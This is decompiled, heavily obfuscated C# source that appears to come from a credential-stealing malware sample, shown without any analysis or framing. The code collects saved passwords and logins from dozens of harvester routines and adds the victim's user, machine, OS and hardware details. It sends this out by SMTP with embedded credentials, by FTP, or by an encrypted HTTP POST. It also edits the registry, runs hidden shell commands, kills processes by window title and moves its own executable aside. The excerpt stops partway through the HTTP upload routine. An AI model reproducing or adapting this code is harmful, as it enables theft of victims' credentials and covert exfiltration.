	public static void bds()
	{
		DateTime now = DateTime.Now;
		string format = <Module>.smethod_0(603920);
		StringBuilder stringBuilder = new StringBuilder();
		StringBuilder stringBuilder2;
		for (;;)
		{
			IL_56:
			uint num = 4221383029u;
			for (;;)
			{
				uint num2;
				switch ((num2 = (num ^ 3839047584u)) % 3u)
				{
				case 1u:
					stringBuilder2 = new StringBuilder();
					num = (num2 * 3824660005u ^ 4257045149u);
					continue;
				case 2u:
					goto IL_56;
				}
				goto Block_1;
			}
		}
		Block_1:
		List<clo> list = new List<clo>();
		stringBuilder2.Append(string.Format(<Module>.smethod_0(603712), new object[]
		{
			<Module>.smethod_0(603760),
			afg.cfg,
			DateTime.Now.ToString(afg.cfh),
			afg.cfj,
			null,
			null,
			null,
			null,
			null
		}));
		try
		{
			list.AddRange(cnq.cnz());
		}
		catch (Exception ex)
		{
		}
		try
		{
			list.AddRange(cnq.cpt());
		}
		catch (Exception ex2)
		{
		}
		try
		{
			list.AddRange(cnq.cox());
		}
		catch (Exception ex3)
		{
		}
		try
		{
			list.AddRange(cnq.coz());
		}
		catch (Exception ex4)
		{
		}
		try
		{
			list.AddRange(cnq.cpw());
		}
		catch (Exception ex5)
		{
		}
		try
		{
			list.AddRange(cnq.des());
		}
		catch (Exception ex6)
		{
		}
		try
		{
			list.AddRange(cnq.dew());
		}
		catch (Exception ex7)
		{
		}
		try
		{
			list.AddRange(cnq.dfj());
		}
		catch (Exception ex8)
		{
			for (;;)
			{
				IL_1EC:
				uint num3 = 3398679896u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num3 ^ 3839047584u)) % 3u)
					{
					case 0u:
						goto IL_1EC;
					case 1u:
						num3 = (num2 * 4095730849u ^ 307105646u);
						continue;
					}
					goto Block_54;
				}
			}
			Block_54:;
		}
		try
		{
			list.AddRange(cnq.dmy());
		}
		catch (Exception ex9)
		{
		}
		try
		{
			list.AddRange(cnq.dfm());
		}
		catch (Exception ex10)
		{
		}
		try
		{
			list.AddRange(cnq.dfp());
		}
		catch (Exception ex11)
		{
		}
		try
		{
			list.AddRange(cnq.dft());
		}
		catch (Exception ex12)
		{
		}
		try
		{
			list.AddRange(cnq.dfy());
		}
		catch (Exception ex13)
		{
		}
		try
		{
			list.AddRange(cnq.dkw());
		}
		catch (Exception ex14)
		{
			for (;;)
			{
				IL_2D3:
				uint num4 = 3851932662u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num4 ^ 3839047584u)) % 3u)
					{
					case 0u:
						goto IL_2D3;
					case 2u:
						num4 = (num2 * 2051490944u ^ 3205751808u);
						continue;
					}
					goto Block_61;
				}
			}
			Block_61:;
		}
		try
		{
			list.AddRange(cnq.dlo());
		}
		catch (Exception ex15)
		{
		}
		try
		{
			list.AddRange(cnq.dlu());
		}
		catch (Exception ex16)
		{
		}
		try
		{
			list.AddRange(cnq.dlq());
		}
		catch (Exception ex17)
		{
		}
		try
		{
			list.AddRange(cnq.fjy());
		}
		catch (Exception ex18)
		{
			for (;;)
			{
				IL_382:
				uint num5 = 3463301927u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num5 ^ 3839047584u)) % 3u)
					{
					case 1u:
						num5 = (num2 * 2896258727u ^ 1393019210u);
						continue;
					case 2u:
						goto IL_382;
					}
					goto Block_66;
				}
			}
			Block_66:;
		}
		try
		{
			list.AddRange(cnq.dkt());
		}
		catch (Exception ex19)
		{
			for (;;)
			{
				IL_3DD:
				uint num6 = 3727586815u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num6 ^ 3839047584u)) % 3u)
					{
					case 1u:
						num6 = (num2 * 2656123543u ^ 1476530452u);
						continue;
					case 2u:
						goto IL_3DD;
					}
					goto Block_68;
				}
			}
			Block_68:;
		}
		try
		{
			list.AddRange(cnq.flv());
		}
		catch (Exception ex20)
		{
		}
		try
		{
			list.AddRange(cnq.fuv());
		}
		catch (Exception ex21)
		{
		}
		try
		{
			list.AddRange(cnq.dgz());
		}
		catch (Exception ex22)
		{
		}
		try
		{
			list.AddRange(cnq.gkn());
		}
		catch (Exception ex23)
		{
		}
		try
		{
			list.AddRange((IEnumerable<clo>)cnq.djt());
		}
		catch (Exception ex24)
		{
		}
		try
		{
			list.AddRange(cnq.fhm());
		}
		catch (Exception ex25)
		{
			for (;;)
			{
				IL_4C9:
				uint num7 = 3443320064u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num7 ^ 3839047584u)) % 3u)
					{
					case 0u:
						goto IL_4C9;
					case 2u:
						num7 = (num2 * 4125249405u ^ 1886278674u);
						continue;
					}
					goto Block_75;
				}
			}
			Block_75:;
		}
		try
		{
			list.AddRange(cnq.dmr());
		}
		catch (Exception ex26)
		{
		}
		try
		{
			list.AddRange(cnq.duw());
		}
		catch (Exception ex27)
		{
			for (;;)
			{
				IL_540:
				uint num8 = 2474684260u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num8 ^ 3839047584u)) % 3u)
					{
					case 1u:
						num8 = (num2 * 3090136801u ^ 294447018u);
						continue;
					case 2u:
						goto IL_540;
					}
					goto Block_78;
				}
			}
			Block_78:;
		}
		try
		{
			list.AddRange(cnq.eou());
		}
		catch (Exception ex28)
		{
		}
		try
		{
			list.AddRange(cnq.dxw());
		}
		catch (Exception ex29)
		{
		}
		string text2;
		string text3;
		string text4;
		try
		{
			string lsz = Interaction.Environ(<Module>.smethod_0(603552)) + <Module>.smethod_0(604496);
			string str = lpx.lsq(lsz);
			for (;;)
			{
				IL_8A3:
				uint num9 = 2904712099u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num9 ^ 3839047584u)) % 11u)
					{
					case 0u:
						goto IL_8A3;
					case 1u:
					{
						string text;
						stringBuilder.AppendLine(<Module>.smethod_0(602000) + text + <Module>.smethod_0(601792));
						stringBuilder.AppendLine(<Module>.smethod_0(601840));
						num9 = (num2 * 1932906766u ^ 1699588599u);
						continue;
					}
					case 2u:
						stringBuilder.AppendLine(<Module>.smethod_0(603504) + text2 + <Module>.smethod_0(603296));
						num9 = (num2 * 1093790855u ^ 3565689552u);
						continue;
					case 3u:
						if (Operators.CompareString(afg.ceg, <Module>.smethod_0(602720), false) == 0)
						{
							num9 = (num2 * 1175652210u ^ 943899520u);
							continue;
						}
						goto IL_781;
					case 4u:
						goto IL_781;
					case 5u:
						stringBuilder.AppendLine(<Module>.smethod_0(603216) + text3 + <Module>.smethod_0(603264));
						stringBuilder.AppendLine(<Module>.smethod_0(603056) + text4 + <Module>.smethod_0(603104));
						num9 = (num2 * 1730611990u ^ 1764175966u);
						continue;
					case 6u:
					{
						string text5 = lpx.luz(<Module>.smethod_0(604544) + str + <Module>.smethod_0(604336));
						num9 = (num2 * 1344880565u ^ 2441690211u);
						continue;
					}
					case 7u:
					{
						string text;
						stringBuilder2.Append(string.Format(<Module>.smethod_0(602640), new object[]
						{
							text,
							text2,
							Uri.EscapeDataString(text3),
							Uri.EscapeDataString(text4)
						}));
						num9 = (num2 * 1018331511u ^ 1731661817u);
						continue;
					}
					case 9u:
					{
						lpx.luz(<Module>.smethod_0(604384) + str + <Module>.smethod_0(604304));
						string text6 = lpx.luz(<Module>.smethod_0(604096) + str + <Module>.smethod_0(604144));
						string text7 = lpx.luz(<Module>.smethod_0(602912) + str + "PW");
						lpx.luz(<Module>.smethod_0(602832) + str + <Module>.smethod_0(602880));
						string text = <Module>.smethod_0(602672);
						string text5;
						text2 = text5;
						text3 = text6;
						text4 = text7;
						if ((text2.Length > 1 | text.Length > 1) & text3.Length > 1 & text4.Length > 1)
						{
							num9 = (num2 * 3008887987u ^ 2583977170u);
							continue;
						}
						break;
					}
					case 10u:
						num9 = (num2 * 2822158237u ^ 2864806038u);
						continue;
					}
					goto Block_84;
					IL_781:
					if (!(Operators.CompareString(afg.ceg, <Module>.smethod_0(603456), false) == 0 | Operators.CompareString(afg.ceg, "ftp", false) == 0))
					{
						goto IL_8AA;
					}
					num9 = 3243121817u;
				}
			}
			Block_84:
			IL_8AA:;
		}
		catch (Exception ex30)
		{
		}
		try
		{
			list.AddRange(cnq.egu());
		}
		catch (Exception ex31)
		{
		}
		try
		{
			list.AddRange(cnq.efp());
		}
		catch (Exception ex32)
		{
		}
		try
		{
			list.AddRange(cnq.ens());
		}
		catch (Exception ex33)
		{
		}
		try
		{
			list.AddRange(cnq.etw());
		}
		catch (Exception ex34)
		{
			for (;;)
			{
				IL_960:
				uint num10 = 3306791288u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num10 ^ 3839047584u)) % 3u)
					{
					case 1u:
						num10 = (num2 * 1455179713u ^ 3549583531u);
						continue;
					case 2u:
						goto IL_960;
					}
					goto Block_90;
				}
			}
			Block_90:;
		}
		try
		{
			list.AddRange((IEnumerable<clo>)lpx.lnt.lnu());
		}
		catch (Exception ex35)
		{
		}
		try
		{
			list.AddRange(cnq.ehy());
		}
		catch (Exception ex36)
		{
		}
		if (list.Count > 0)
		{
			try
			{
				foreach (clo clo in list)
				{
					try
					{
						string text = clo.clx;
						for (;;)
						{
							IL_C2C:
							uint num11 = 3367198267u;
							for (;;)
							{
								uint num2;
								switch ((num2 = (num11 ^ 3839047584u)) % 11u)
								{
								case 1u:
									if ((text2.Length > 1 | text.Length > 1) & text3.Length > 1 & text4.Length > 1)
									{
										num11 = (num2 * 2721197257u ^ 1889737814u);
										continue;
									}
									break;
								case 2u:
									if (Operators.CompareString(afg.ceg, <Module>.smethod_0(601632), false) == 0)
									{
										num11 = (num2 * 1667026467u ^ 2565077771u);
										continue;
									}
									goto IL_AFC;
								case 3u:
									text2 = clo.cly;
									text3 = clo.clu;
									num11 = (num2 * 2721171810u ^ 2007756672u);
									continue;
								case 4u:
									stringBuilder.AppendLine(<Module>.smethod_0(600752));
									num11 = (num2 * 2868931468u ^ 3738557718u);
									continue;
								case 5u:
									goto IL_AFC;
								case 6u:
									stringBuilder2.Append(string.Format(<Module>.smethod_0(601552), new object[]
									{
										text,
										text2,
										Uri.EscapeDataString(text3),
										Uri.EscapeDataString(text4)
									}));
									num11 = (num2 * 3610021003u ^ 1014936986u);
									continue;
								case 7u:
									stringBuilder.AppendLine(<Module>.smethod_0(600912) + text + <Module>.smethod_0(600960));
									num11 = (num2 * 402823830u ^ 5765866u);
									continue;
								case 8u:
									text4 = clo.clv;
									num11 = (num2 * 1896636998u ^ 1175092319u);
									continue;
								case 9u:
									goto IL_C2C;
								case 10u:
									stringBuilder.AppendLine(<Module>.smethod_0(602416) + text2 + <Module>.smethod_0(602464));
									stringBuilder.AppendLine(<Module>.smethod_0(602384) + text3 + <Module>.smethod_0(602176));
									stringBuilder.AppendLine(<Module>.smethod_0(602224) + text4 + <Module>.smethod_0(602016));
									num11 = (num2 * 3950591738u ^ 3583744327u);
									continue;
								}
								goto Block_100;
								IL_AFC:
								if (!(Operators.CompareString(afg.ceg, <Module>.smethod_0(601600), false) == 0 | Operators.CompareString(afg.ceg, "ftp", false) == 0))
								{
									goto IL_C33;
								}
								num11 = 3652583884u;
							}
						}
						Block_100:
						IL_C33:;
					}
					catch (Exception ex37)
					{
					}
				}
			}
			finally
			{
				List<clo>.Enumerator enumerator;
				((IDisposable)enumerator).Dispose();
			}
		}
		if (stringBuilder.ToString().Length > 4)
		{
			if (Operators.CompareString(afg.ceg, <Module>.smethod_0(600800), false) == 0)
			{
				try
				{
					string bhj = SystemInformation.UserName + "/" + SystemInformation.ComputerName + <Module>.smethod_0(600720);
					string[] array = new string[16];
					array[0] = <Module>.smethod_0(600512);
					for (;;)
					{
						IL_EA4:
						uint num12 = 3319126663u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num12 ^ 3839047584u)) % 11u)
							{
							case 0u:
								array[8] = <Module>.smethod_0(601344);
								array[9] = afg.alr(afg.hp.ProcessorName);
								num12 = (num2 * 1134841012u ^ 3046762153u);
								continue;
							case 1u:
								array[1] = now.ToString(format);
								num12 = (num2 * 1441305432u ^ 3359296744u);
								continue;
							case 2u:
								array[14] = <Module>.smethod_0(601104);
								num12 = (num2 * 2321085533u ^ 1929698296u);
								continue;
							case 3u:
								goto IL_EA4;
							case 5u:
								array[2] = <Module>.smethod_0(600560);
								array[3] = SystemInformation.UserName;
								num12 = (num2 * 274156141u ^ 226595653u);
								continue;
							case 6u:
								array[12] = <Module>.smethod_0(601184);
								array[13] = afg.cfk;
								num12 = (num2 * 687445058u ^ 1074612908u);
								continue;
							case 7u:
							{
								array[15] = stringBuilder.ToString();
								string bhk = string.Concat(array);
								afg.bgq(<Module>.smethod_0(599872), bhj, bhk, "", "");
								num12 = (num2 * 408479654u ^ 607285954u);
								continue;
							}
							case 8u:
								array[5] = SystemInformation.ComputerName;
								array[6] = <Module>.smethod_0(601296);
								array[7] = hj.hk.Info.OSFullName;
								num12 = (num2 * 4267413820u ^ 2375938539u);
								continue;
							case 9u:
								array[10] = <Module>.smethod_0(601136);
								array[11] = afg.alr(afg.hp.AmountOfMemory);
								num12 = (num2 * 1235695630u ^ 1484901655u);
								continue;
							case 10u:
								array[4] = <Module>.smethod_0(601376);
								num12 = (num2 * 1101026981u ^ 3591800307u);
								continue;
							}
							goto Block_104;
						}
					}
					Block_104:
					goto IL_10D9;
				}
				catch (Exception ex38)
				{
					stringBuilder = null;
					goto IL_10D9;
				}
			}
			if (Operators.CompareString(afg.ceg, "ftp", false) == 0)
			{
				string format2 = <Module>.smethod_0(599920);
				try
				{
					string[] array = new string[5];
					array[0] = <Module>.smethod_0(599712);
					array[1] = afg.cfj.Replace("/", "-");
					array[2] = "_";
					array[3] = DateTime.Now.ToString(format2);
					for (;;)
					{
						IL_1082:
						uint num13 = 3537355364u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num13 ^ 3839047584u)) % 3u)
							{
							case 0u:
								goto IL_1082;
							case 1u:
								array[4] = <Module>.smethod_0(599632);
								afg.bcu(string.Concat(array), string.Concat(new string[]
								{
									<Module>.smethod_0(599680),
									now.ToString(format),
									<Module>.smethod_0(599472),
									SystemInformation.UserName,
									<Module>.smethod_0(599520),
									SystemInformation.ComputerName,
									<Module>.smethod_0(600464),
									hj.hk.Info.OSFullName,
									<Module>.smethod_0(600256),
									afg.alr(afg.hp.ProcessorName),
									<Module>.smethod_0(600304),
									afg.alr(afg.hp.AmountOfMemory),
									<Module>.smethod_0(600096),
									afg.cfk,
									<Module>.smethod_0(600016),
									stringBuilder.ToString().Replace("\0", ""),
									<Module>.smethod_0(600064)
								}));
								num13 = (num2 * 936242530u ^ 2405189857u);
								continue;
							}
							goto Block_107;
						}
					}
					Block_107:;
				}
				catch (Exception ex39)
				{
					for (;;)
					{
						IL_10D0:
						uint num14 = 3508800222u;
						for (;;)
						{
							uint num2;
							switch ((num2 = (num14 ^ 3839047584u)) % 3u)
							{
							case 0u:
								goto IL_10D0;
							case 1u:
								stringBuilder = null;
								num14 = (num2 * 2910527461u ^ 219209633u);
								continue;
							}
							goto Block_109;
						}
					}
					Block_109:;
				}
			}
			IL_10D9:
			stringBuilder = null;
			goto IL_1116;
		}
		goto IL_1143;
		uint num15;
		for (;;)
		{
			IL_111B:
			uint num2;
			switch ((num2 = (num15 ^ 3839047584u)) % 4u)
			{
			case 0u:
				goto IL_1116;
			case 1u:
				afg.bly(stringBuilder2.ToString().Replace("\0", ""));
				stringBuilder2 = null;
				num15 = (num2 * 706785150u ^ 557285300u);
				continue;
			case 3u:
				goto IL_1143;
			}
			break;
		}
		return;
		IL_1116:
		num15 = 3992050779u;
		goto IL_111B;
		IL_1143:
		if (Operators.CompareString(afg.ceg, <Module>.smethod_0(598832), false) == 0)
		{
			num15 = 3285460325u;
			goto IL_111B;
		}
	}

	// Token: 0x06000067 RID: 103 RVA: 0x0001E728 File Offset: 0x0001C928
	public static bool bgq(string bgz, string bhj, string bhk, string bhl = "", string bhm = "")
	{
		bool result;
		try
		{
			SmtpClient smtpClient = new SmtpClient();
			for (;;)
			{
				IL_1D9:
				uint num = 55099780u;
				for (;;)
				{
					uint num2;
					NetworkCredential credentials;
					switch ((num2 = (num ^ 1204325995u)) % 12u)
					{
					case 0u:
						goto IL_1D9;
					case 1u:
						goto IL_B1;
					case 3u:
					{
						smtpClient.Port = 587;
						MailMessage mailMessage;
						smtpClient.Send(mailMessage);
						mailMessage.Attachments.Dispose();
						num = (num2 * 3354996070u ^ 1848862495u);
						continue;
					}
					case 4u:
						smtpClient.UseDefaultCredentials = false;
						num = (num2 * 2019534945u ^ 1258051914u);
						continue;
					case 5u:
						smtpClient.Credentials = credentials;
						smtpClient.EnableSsl = false;
						num = (num2 * 3710424002u ^ 1563056346u);
						continue;
					case 6u:
						goto IL_9D;
					case 7u:
					{
						MailAddress to = new MailAddress(bgz);
						MailAddress from = new MailAddress(<Module>.smethod_0(598880));
						MailMessage mailMessage = new MailMessage(from, to);
						mailMessage.IsBodyHtml = true;
						mailMessage.Subject = bhj;
						num = (num2 * 2040177516u ^ 3723160283u);
						continue;
					}
					case 8u:
					{
						MailMessage mailMessage;
						mailMessage.Body = bhk;
						if (Strings.Len(bhl) > 0)
						{
							num = (num2 * 2087356278u ^ 1002494305u);
							continue;
						}
						goto IL_9D;
					}
					case 9u:
					{
						Attachment item = new Attachment(bhm);
						num = (num2 * 3281138299u ^ 2319859779u);
						continue;
					}
					case 10u:
					{
						Attachment item2 = new Attachment(bhl);
						MailMessage mailMessage;
						mailMessage.Attachments.Add(item2);
						num = (num2 * 3355082071u ^ 449075611u);
						continue;
					}
					case 11u:
					{
						MailMessage mailMessage;
						Attachment item;
						mailMessage.Attachments.Add(item);
						num = (num2 * 3918896317u ^ 2623561821u);
						continue;
					}
					}
					goto Block_4;
					IL_9D:
					if (Strings.Len(bhm) > 0)
					{
						num = 243113458u;
						continue;
					}
					IL_B1:
					credentials = new NetworkCredential(<Module>.smethod_0(598800), <Module>.smethod_0(598592));
					smtpClient.Host = <Module>.smethod_0(598640);
					num = 1542662727u;
				}
			}
			Block_4:
			result = true;
		}
		catch (Exception ex)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x06000068 RID: 104
	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool DeleteFile(string bhq);

	// Token: 0x06000069 RID: 105 RVA: 0x0001E948 File Offset: 0x0001CB48
	public static void bhz(string bjk)
	{
		try
		{
			if (File.Exists(bjk))
			{
				for (;;)
				{
					IL_54:
					uint num = 2123767238u;
					for (;;)
					{
						uint num2;
						switch ((num2 = (num ^ 77481623u)) % 3u)
						{
						case 0u:
							goto IL_54;
						case 2u:
							afg.DeleteFile(bjk + <Module>.smethod_0(598432));
							num = (num2 * 3711320645u ^ 1644441177u);
							continue;
						}
						goto Block_3;
					}
				}
				Block_3:;
			}
		}
		catch (Exception ex)
		{
			for (;;)
			{
				IL_9F:
				uint num3 = 1688886788u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num3 ^ 77481623u)) % 3u)
					{
					case 0u:
						goto IL_9F;
					case 1u:
						num3 = (num2 * 3748514241u ^ 2334633916u);
						continue;
					}
					goto Block_5;
				}
			}
			Block_5:;
		}
	}

	// Token: 0x0600006A RID: 106 RVA: 0x0001EA10 File Offset: 0x0001CC10
	public static void bjl()
	{
		try
		{
			if (afg.cej)
			{
				goto IL_FD;
			}
			goto IL_313;
			uint num2;
			for (;;)
			{
				IL_28E:
				uint num;
				switch ((num = (num2 ^ 2628923774u)) % 20u)
				{
				case 0u:
					hj.hk.Registry.SetValue(<Module>.smethod_0(581328), <Module>.smethod_0(581376), "1", RegistryValueKind.String);
					num2 = (num * 3336544940u ^ 2443866283u);
					continue;
				case 1u:
					goto IL_2FD;
				case 2u:
					Interaction.Shell(<Module>.smethod_0(599264), AppWinStyle.NormalFocus, false, -1);
					hj.hk.Registry.SetValue(<Module>.smethod_0(599184), <Module>.smethod_0(598976), "1", RegistryValueKind.DWord);
					num2 = (num * 3256947568u ^ 2978013824u);
					continue;
				case 3u:
					goto IL_19;
				case 4u:
					hj.hk.Registry.SetValue(<Module>.smethod_0(581168), <Module>.smethod_0(581216), "1", RegistryValueKind.DWord);
					num2 = (num * 1481045803u ^ 2957092673u);
					continue;
				case 5u:
					goto IL_2D;
				case 6u:
					Interaction.Shell(<Module>.smethod_0(599216), AppWinStyle.NormalFocus, false, -1);
					num2 = (num * 1813527956u ^ 4002523599u);
					continue;
				case 7u:
					goto IL_37;
				case 8u:
					goto IL_313;
				case 9u:
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(<Module>.smethod_0(582000), true);
					registryKey.DeleteSubKey(<Module>.smethod_0(581792), true);
					num2 = (num * 2761110792u ^ 91049263u);
					continue;
				}
				case 10u:
					goto IL_0F;
				case 11u:
					Interaction.Shell(<Module>.smethod_0(581136), AppWinStyle.Hide, false, -1);
					Interaction.Shell(<Module>.smethod_0(581952), AppWinStyle.Hide, false, -1);
					num2 = (num * 1631208354u ^ 104962557u);
					continue;
				case 12u:
					goto IL_FD;
				case 13u:
					goto IL_41;
				case 14u:
					goto IL_23;
				case 16u:
					hj.hk.Registry.SetValue(<Module>.smethod_0(599376), <Module>.smethod_0(599424), "0");
					num2 = (num * 1960564339u ^ 3466507938u);
					continue;
				case 17u:
				{
					RegistryKey registryKey;
					registryKey.Close();
					num2 = (num * 2216961671u ^ 2164756650u);
					continue;
				}
				case 18u:
					Interaction.Shell(<Module>.smethod_0(581408), AppWinStyle.NormalFocus, false, -1);
					num2 = (num * 1095452046u ^ 757875176u);
					continue;
				case 19u:
					Interaction.Shell(<Module>.smethod_0(599024), AppWinStyle.NormalFocus, false, -1);
					num2 = (num * 1361374810u ^ 3847554823u);
					continue;
				}
				break;
			}
			goto IL_31C;
			IL_0F:
			if (afg.cem)
			{
				num2 = 3657525829u;
				goto IL_28E;
			}
			IL_19:
			if (afg.cep)
			{
				num2 = 2279029300u;
				goto IL_28E;
			}
			IL_23:
			if (afg.cen)
			{
				num2 = 2197799302u;
				goto IL_28E;
			}
			IL_2D:
			if (afg.ceo)
			{
				num2 = 3220472646u;
				goto IL_28E;
			}
			IL_37:
			if (afg.ces)
			{
				num2 = 2870867913u;
				goto IL_28E;
			}
			IL_41:
			if (afg.cer)
			{
				num2 = 3939835235u;
				goto IL_28E;
			}
			goto IL_31C;
			IL_FD:
			num2 = 4073116130u;
			goto IL_28E;
			IL_2FD:
			if (afg.cel)
			{
				num2 = 3461712320u;
				goto IL_28E;
			}
			goto IL_0F;
			IL_313:
			if (afg.cek)
			{
				num2 = 2986013612u;
				goto IL_28E;
			}
			goto IL_2FD;
			IL_31C:;
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600006B RID: 107
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetModuleFileNameA(int bjp, [MarshalAs(UnmanagedType.VBByRefStr)] ref string bjr, int bjs);

	// Token: 0x0600006C RID: 108
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int MoveFileExW([MarshalAs(UnmanagedType.LPTStr)] [In] string bju, [MarshalAs(UnmanagedType.LPTStr)] [In] string bjv, long bjy);

	// Token: 0x0600006D RID: 109 RVA: 0x0001ED68 File Offset: 0x0001CF68
	public static void bjx()
	{
		try
		{
			string executablePath = Application.ExecutablePath;
			int bjp = 0;
			string executablePath2 = Application.ExecutablePath;
			afg.MoveFileExW(afg.bkl(executablePath, afg.GetModuleFileNameA(bjp, ref executablePath2, 256)), Path.GetTempPath() + <Module>.smethod_0(581712) + DateTime.Now.Millisecond.ToString() + <Module>.smethod_0(581760), 8L);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600006E RID: 110 RVA: 0x0001EDF4 File Offset: 0x0001CFF4
	public static string bkl(string bkm, int bkn)
	{
		if (bkn < 0)
		{
			goto IL_38;
		}
		goto IL_75;
		uint num2;
		for (;;)
		{
			IL_3D:
			uint num;
			switch ((num = (num2 ^ 325117025u)) % 8u)
			{
			case 0u:
				goto IL_38;
			case 1u:
				return bkm;
			case 3u:
				if (bkm.Length == 0)
				{
					num2 = (num * 1937691557u ^ 3696620523u);
					continue;
				}
				goto IL_0D;
			case 4u:
				goto IL_0D;
			case 5u:
				goto IL_A6;
			case 6u:
				goto IL_86;
			case 7u:
				goto IL_75;
			}
			break;
			IL_0D:
			if (bkm.Length > bkn)
			{
				break;
			}
			num2 = 990889496u;
		}
		return bkm.Substring(0, bkn);
		IL_86:
		throw new ArgumentOutOfRangeException(<Module>.smethod_0(581552), bkn, <Module>.smethod_0(581600));
		IL_38:
		num2 = 671870223u;
		goto IL_3D;
		IL_75:
		if (bkn != 0)
		{
			num2 = 861953946u;
			goto IL_3D;
		}
		IL_A6:
		return "";
	}

	// Token: 0x0600006F RID: 111 RVA: 0x0001EEAC File Offset: 0x0001D0AC
	public static bool bkp(string bkr)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		for (;;)
		{
			IL_7F:
			uint num2 = 2168951349u;
			for (;;)
			{
				uint num3;
				switch ((num3 = (num2 ^ 4226220258u)) % 7u)
				{
				case 1u:
					goto IL_22;
				case 2u:
					num2 = (num3 * 1204064363u ^ 1613588583u);
					continue;
				case 3u:
					return true;
				case 4u:
					if (num >= processes.Length)
					{
						num2 = 3966891456u;
						continue;
					}
					goto IL_22;
				case 5u:
					goto IL_7F;
				case 6u:
					goto IL_0A;
				}
				return false;
				IL_0A:
				checked
				{
					num++;
					num2 = 3246335930u;
					continue;
					IL_22:
					Process process = processes[num];
					if (!process.ProcessName.StartsWith(bkr))
					{
						goto IL_0A;
					}
					num2 = 2617119369u;
				}
			}
		}
		return false;
	}

	// Token: 0x06000070 RID: 112 RVA: 0x0001EF44 File Offset: 0x0001D144
	public static void bky()
	{
		System.Timers.Timer timer = new System.Timers.Timer();
		for (;;)
		{
			IL_7A:
			uint num = 2942057463u;
			for (;;)
			{
				uint num2;
				switch ((num2 = (num ^ 3778612062u)) % 4u)
				{
				case 0u:
					goto IL_7A;
				case 1u:
					timer.Elapsed += afg.bkw;
					timer.Enabled = true;
					num = (num2 * 1966610126u ^ 1230118515u);
					continue;
				case 3u:
					timer.Interval = 1000.0;
					num = (num2 * 2591307809u ^ 3483048391u);
					continue;
				}
				goto Block_1;
			}
		}
		Block_1:
		timer.Start();
	}

	// Token: 0x06000071 RID: 113 RVA: 0x0001EFD8 File Offset: 0x0001D1D8
	public static void bkw(object sender, ElapsedEventArgs e)
	{
		string[] array = new string[]
		{
			<Module>.smethod_0(580496)
		};
		string[] array2;
		Process[] array3;
		int num3;
		for (;;)
		{
			IL_81:
			uint num = 3731928669u;
			for (;;)
			{
				uint num2;
				switch ((num2 = (num ^ 4010834621u)) % 5u)
				{
				case 0u:
					goto IL_81;
				case 2u:
					goto IL_88;
				case 3u:
					array2 = array;
					if (array2.Length != 0)
					{
						num = (num2 * 2171173537u ^ 3960848618u);
						continue;
					}
					return;
				case 4u:
				{
					Process[] processes = Process.GetProcesses();
					array3 = processes;
					num3 = 0;
					num = (num2 * 4063573384u ^ 3843700216u);
					continue;
				}
				}
				goto Block_2;
			}
		}
		for (;;)
		{
			IL_12A:
			uint num2;
			uint num4;
			switch ((num2 = (num4 ^ 4010834621u)) % 5u)
			{
			case 0u:
				goto IL_10D;
			case 1u:
				goto IL_98;
			case 2u:
				goto IL_88;
			case 3u:
				checked
				{
					num3++;
				}
				num4 = (num2 * 3758812826u ^ 4135205808u);
				continue;
			}
			break;
		}
		return;
		Block_2:
		goto IL_16A;
		IL_88:
		if (num3 >= array3.Length)
		{
			uint num4 = 3117682364u;
			goto IL_12A;
		}
		goto IL_16A;
		IL_98:
		int num5;
		int num6;
		if (num5 > num6)
		{
			uint num4 = 2436262355u;
			goto IL_12A;
		}
		try
		{
			Process process;
			if (process.MainWindowTitle.ToLower().Contains(array2[num5].ToLower()))
			{
				for (;;)
				{
					IL_F6:
					uint num7 = 2625848503u;
					for (;;)
					{
						uint num2;
						switch ((num2 = (num7 ^ 4010834621u)) % 3u)
						{
						case 1u:
							process.Kill();
							num7 = (num2 * 3679320327u ^ 1964669149u);
							continue;
						case 2u:
							goto IL_F6;
						}
						goto Block_8;
					}
				}
				Block_8:;
			}
			goto IL_15D;
		}
		catch (Exception ex)
		{
			goto IL_15D;
		}
		goto IL_10D;
		IL_15D:
		checked
		{
			num5++;
			IL_10D:
			uint num4 = 2758574606u;
			goto IL_12A;
			IL_16A:
			Process process = array3[num3];
			int num8 = 0;
			num6 = array2.Length - 1;
			num5 = num8;
			goto IL_98;
		}
	}

	// Token: 0x06000072 RID: 114 RVA: 0x0001F174 File Offset: 0x0001D374
	public static string bly(string blx)
	{
		try
		{
			afg.hr hr = new afg.hr(<Module>.smethod_0(580288));
			blx = "p=" + hr.hs(blx);
			string requestUriString = <Module>.smethod_0(580336);
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
			httpWebRequest.Credentials = CredentialCache.DefaultCredentials;
			byte[] bytes;
			for (;;)
			{
				IL_114:
				uint num = 2742847218u;
				for (;;)
				{
					uint num2;
					switch ((num2 = (num ^ 4196697267u)) % 4u)
					{
					case 1u:
						httpWebRequest.KeepAlive = true;
						httpWebRequest.Timeout = 10000;
						httpWebRequest.AllowAutoRedirect = true;
						httpWebRequest.MaximumAutomaticRedirections = 50;
						httpWebRequest.UserAgent = <Module>.smethod_0(580128);
						httpWebRequest.Method = <Module>.smethod_0(580048);
						blx = blx.Replace("+", "%2B");
						bytes = Encoding.UTF8.GetBytes(blx);
						httpWebRequest.ContentType = <Module>.smethod_0(580096);
						httpWebRequest.ContentLength = (long)bytes.Length;
						num = (num2 * 1643764981u ^ 851183837u);
						continue;
					case 2u:
						goto IL_114;
					case 3u:
